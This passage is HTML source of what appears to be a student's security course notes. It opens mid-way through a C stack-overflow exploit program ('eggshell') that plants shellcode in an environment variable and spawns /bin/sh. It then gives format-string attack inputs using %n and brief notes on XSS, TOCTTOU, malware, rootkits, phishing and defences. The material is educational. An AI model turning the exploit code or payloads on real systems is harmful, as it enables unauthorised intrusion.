&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#447fcf&#34;&gt;strlen&lt;/span&gt;(shellcode); i++)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    *(ptr++) = shellcode[i];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  bof[bsize - &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  egg[eggsize - &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;memcpy&lt;/span&gt;(egg,&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;EGG=&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;putenv&lt;/span&gt;(egg);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;memcpy&lt;/span&gt;(bof,&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;BOF=&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;putenv&lt;/span&gt;(bof);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;usage&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;)&lt;span style=&#34;color:#447fcf&#34;&gt;fprintf&lt;/span&gt;(stderr,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;usage: eggshell [-a &amp;lt;alignment&amp;gt;] [-b &amp;lt;buffersize&amp;gt;] [-e &amp;lt;eggsize&amp;gt;] [-o &amp;lt;offset&amp;gt;]&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the end&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SHELL CODE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NOP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FILLED RAS
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
&lt;h3 id=&#34;single-bytes-buffer-overflow&#34; &gt;Single Bytes Buffer Overflow
&lt;span&gt;
    &lt;a href=&#34;#single-bytes-buffer-overflow&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Programmers forget to allocate null terminator so a single byte can be written past the end of the buffer&lt;/li&gt;
&lt;li&gt;Heap Overflow&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;causes&#34; &gt;Causes
&lt;span&gt;
    &lt;a href=&#34;#causes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Missing boundary check&lt;/li&gt;
&lt;li&gt;Ability to overwrite important memory regions&lt;/li&gt;
&lt;li&gt;Data is treated as code and executed&lt;/li&gt;
&lt;li&gt;Predictability of the addresses&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;defences&#34; &gt;Defences
&lt;span&gt;
    &lt;a href=&#34;#defences&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Use a language with bounds checking&lt;/li&gt;
&lt;li&gt;Canaries (padding between data and return address)&lt;/li&gt;
&lt;li&gt;Check if stack has been overwritten before the return from each function&lt;/li&gt;
&lt;li&gt;OS&lt;/li&gt;
&lt;li&gt;Hardware&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cross-site-scripting-xss-attacks&#34; &gt;Cross-Site Scripting (XSS) Attacks
&lt;span&gt;
    &lt;a href=&#34;#cross-site-scripting-xss-attacks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Use browser interprets the data as code&lt;/li&gt;
&lt;li&gt;Client-side mediation
&lt;ul&gt;
&lt;li&gt;Invalid data&lt;/li&gt;
&lt;li&gt;Client is arbitrary, so need to enforce validation on server&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;format-string-vulnerabilities&#34; &gt;Format String Vulnerabilities
&lt;span&gt;
    &lt;a href=&#34;#format-string-vulnerabilities&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;printf(buffer) instead of printf(&amp;quot;%s&amp;quot;, buffer)&lt;/li&gt;
&lt;li&gt;provide input:&lt;code&gt;%d...%s&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Suppose we want to read a variable &lt;code&gt;pin&lt;/code&gt; and the address through debugging is said to be &lt;code&gt;0x0804fa88&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Provide input &lt;code&gt;0x0804fa888%d...%s&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Provide input &lt;code&gt;0x0804fa888%d...%n&lt;/code&gt; ← %n can change the value&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tocttou&#34; &gt;TOCTTOU
&lt;span&gt;
    &lt;a href=&#34;#tocttou&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;time-of-check to time-of-use&lt;/li&gt;
&lt;li&gt;gap between time of check and the time of use&lt;/li&gt;
&lt;li&gt;unix terminal was running with SU to allocate terminals to users (which was a privilege operation)&lt;/li&gt;
&lt;li&gt;Supported command to write to log file&lt;/li&gt;
&lt;li&gt;First checks if the user has the permissions to write to the requested file, and opens the file for writing&lt;/li&gt;
&lt;li&gt;The attacker would first make a symbolic link to a file they she owned, and then changes it to another file&lt;/li&gt;
&lt;li&gt;The attacker would most likely run the exploit in a loop&lt;/li&gt;
&lt;li&gt;Defences:
&lt;ul&gt;
&lt;li&gt;Atomic operation&lt;/li&gt;
&lt;li&gt;Use file handles not file names since file handles cannot be changed&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;malicious-code-malware&#34; &gt;Malicious code: Malware
&lt;span&gt;
    &lt;a href=&#34;#malicious-code-malware&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Malicious software
&lt;ul&gt;
&lt;li&gt;User action
&lt;ul&gt;
&lt;li&gt;Channels
&lt;ul&gt;
&lt;li&gt;USBs are automatically executed&lt;/li&gt;
&lt;li&gt;Downloading and running&lt;/li&gt;
&lt;li&gt;Executable email attachment&lt;/li&gt;
&lt;li&gt;Inserting CD/DVD or USB flash drive&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Exploiting an existing fault in a system
&lt;ul&gt;
&lt;li&gt;Whatsapp buffer overflows is SMS daemon&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Virus
&lt;ul&gt;
&lt;li&gt;Adds itself to benign programs/files&lt;/li&gt;
&lt;li&gt;Code for spreading + code for actual attack&lt;/li&gt;
&lt;li&gt;Usually activated by users&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Worms
&lt;ul&gt;
&lt;li&gt;Spreading with no or little user involvement&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Trojans
&lt;ul&gt;
&lt;li&gt;HIdden in seemingly innocent program&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Logic bombs
&lt;ul&gt;
&lt;li&gt;Hidden in programs already on your machine&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Infection&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Infection
&lt;ul&gt;
&lt;li&gt;Infect the computer itself&lt;/li&gt;
&lt;li&gt;Modifying the boot loader&lt;/li&gt;
&lt;li&gt;Executable: modifying other programs and add to the beginning&lt;/li&gt;
&lt;li&gt;Macros: edit other documents to add itself as a macro which starts automatically&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Payload
&lt;ul&gt;
&lt;li&gt;The bad thing
&lt;ul&gt;
&lt;li&gt;Erase hard drive&lt;/li&gt;
&lt;li&gt;Corrupt some of your spreadsheets&lt;/li&gt;
&lt;li&gt;Keylogger&lt;/li&gt;
&lt;li&gt;Attacks a website&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Signature-based protection
&lt;ul&gt;
&lt;li&gt;Keep a list of all known viruses&lt;/li&gt;
&lt;li&gt;Infection code and payload code&lt;/li&gt;
&lt;li&gt;viruses try obfuscation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Polymorphism
&lt;ul&gt;
&lt;li&gt;When code is shared, the virus is encrypted, and then decrypted&lt;/li&gt;
&lt;li&gt;Encrypt with different keys for different machines&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Behaviour-based protection
&lt;ul&gt;
&lt;li&gt;Run in a sandbox first&lt;/li&gt;
&lt;li&gt;Look for suspicious patterns not specific code fragments&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;False negative vs. False positive
&lt;ul&gt;
&lt;li&gt;False negative is worse&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code Red Worm
&lt;ul&gt;
&lt;li&gt;2001, IIS exploit, patch available for more than one month&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Stuxnet
&lt;ul&gt;
&lt;li&gt;Discovered in 2010, targets Siemens SCADA systems installed on Windows. Gas centrifuges.&lt;/li&gt;
&lt;li&gt;Four zero-day vulnerabilities&lt;/li&gt;
&lt;li&gt;Very targeted&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT Malware
&lt;ul&gt;
&lt;li&gt;Limited in terms of resources&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Trojan Horses
&lt;ul&gt;
&lt;li&gt;Programs which claim to do something innocuous but hide malicious behaviour&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scareware&lt;/li&gt;
&lt;li&gt;Ransomware&lt;/li&gt;
&lt;li&gt;Web bug
&lt;ul&gt;
&lt;li&gt;Intuit violation of privacy&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Back doors
&lt;ul&gt;
&lt;li&gt;Debugging left overs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
&lt;span&gt;
    &lt;a href=&#34;#privilege-escalation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;A legitimate part that runs with higher privieldge&lt;/li&gt;
&lt;li&gt;Attacker wants to trick the system into running custom command&lt;/li&gt;
&lt;li&gt;StrandHogg 2.0: Critical Android flow allows app hijacking, data theft&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;rootkits&#34; &gt;Rootkits
&lt;span&gt;
    &lt;a href=&#34;#rootkits&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;often used by script kiddies&lt;/li&gt;
&lt;li&gt;Two main parts
&lt;ul&gt;
&lt;li&gt;gaining unauthorized root / admin priviledges
&lt;ul&gt;
&lt;li&gt;known exploit&lt;/li&gt;
&lt;li&gt;backdoor added&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;hides existence
&lt;ul&gt;
&lt;li&gt;clean up log messages created by exploit&lt;/li&gt;
&lt;li&gt;modify commands like ls and ps to not report files and processes by the rootkit&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Example: Sony XCP&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mark Russinovinch developed rootkit scanner for Windows&lt;/li&gt;
&lt;li&gt;Sony audio CD player (XCP) &amp;ldquo;copy protection&amp;rdquo;&lt;/li&gt;
&lt;li&gt;audio CD has an autorun.exe which auto executes and installs a rootkit&lt;/li&gt;
&lt;li&gt;Sony released an uninstaller that left a back door&lt;/li&gt;
&lt;li&gt;Hard to find and uninstall because files and processes started with $sys$ were hidden&lt;/li&gt;
&lt;li&gt;It&amp;rsquo;s basically HIV but for computers&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;keystroke-logger&#34; &gt;Keystroke Logger
&lt;span&gt;
    &lt;a href=&#34;#keystroke-logger&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;record of email / IM you send, all passwords you type&lt;/li&gt;
&lt;li&gt;data can abe access locally or sent to a remote server&lt;/li&gt;
&lt;li&gt;installed by malware&lt;/li&gt;
&lt;li&gt;application specific&lt;/li&gt;
&lt;li&gt;system specific&lt;/li&gt;
&lt;li&gt;hardware keyboard logger&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;interface-illusions&#34; &gt;Interface Illusions
&lt;span&gt;
    &lt;a href=&#34;#interface-illusions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;What if dragging on that “scrollbar” really dragged a program (from a malicious website) into your “Startup” folder (in addition to scrolling the document)? This really happened&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Conficker worm had &amp;ldquo;open folder and view files&amp;rdquo; under Install or run program.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;clickjacking&#34; &gt;Clickjacking
&lt;span&gt;
    &lt;a href=&#34;#clickjacking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;trick user into clicking something disguised as innocuous&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;phishing&#34; &gt;Phishing
&lt;span&gt;
    &lt;a href=&#34;#phishing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Example of interface illusion&lt;/li&gt;
&lt;li&gt;Can make the website look like the real thing
&lt;ul&gt;
&lt;li&gt;Everything except for the URL (but it&amp;rsquo;s possible to have very hidden characters)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;man-in-the-middle&#34; &gt;Man-in-The-Middle
&lt;span&gt;
    &lt;a href=&#34;#man-in-the-middle&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;man in the middle intercepts communication from user and sends it to the intended party&lt;/li&gt;
&lt;li&gt;sees, records, and can capture passwords, and insert malicious commands&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;nonmalicious-flaws-covert-channels&#34; &gt;Nonmalicious flaws: Covert Channels
&lt;span&gt;
    &lt;a href=&#34;#nonmalicious-flaws-covert-channels&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Attacker creates a capability to transfer sensitive Information through a channel that is not supposed to transmit information&lt;/li&gt;
